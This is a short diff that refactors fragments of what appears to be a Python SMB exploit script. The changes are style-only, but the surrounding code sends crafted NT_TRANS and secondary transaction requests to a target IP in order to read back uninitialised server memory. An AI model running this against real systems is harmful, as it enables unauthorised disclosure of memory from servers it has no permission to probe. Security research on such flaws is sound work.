@@ -12,7 +12,7 @@ USERNAME = ''
 PASSWORD = ''
 
 if len(sys.argv) != 3:
-	print("{} <ip> <pipe_name>".format(sys.argv[0]))
+	print(f"{sys.argv[0]} <ip> <pipe_name>")
 	sys.exit(1)
 
 target = sys.argv[1]
@@ -31,7 +31,7 @@ mid = conn.next_mid()
 conn.send_nt_trans(5, mid=mid, param=pack('<HH', fid, 0), data='A'*0x1000, totalDataCount=0x8000)
 
 # send secondary to set data at displacement 0 to leave uninitialize data in InData
-for i in range(7):
+for _ in range(7):
 	conn.send_nt_trans_secondary(mid, data='B'*0x1000)
 
 data = conn.recv_transaction_data(mid, 0x8000)
